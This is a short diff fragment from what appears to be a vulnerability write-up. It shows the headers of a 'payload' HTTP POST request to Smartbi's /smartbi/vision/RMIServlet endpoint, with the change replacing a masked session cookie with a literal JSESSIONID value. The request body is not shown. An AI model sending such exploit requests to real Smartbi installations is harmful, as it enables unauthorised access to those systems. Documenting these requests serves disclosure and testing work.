@@ -70,7 +70,7 @@ payload：
 ```http
 POST /smartbi/vision/RMIServlet HTTP/1.1
 Host: IP：PORT
-Cookie: JSESSIONID=B******************************0
+Cookie: JSESSIONID=B49B33FAF5B8F0
 Content-Length: 67
 Cache-Control: max-age=0
 Sec-Ch-Ua: 
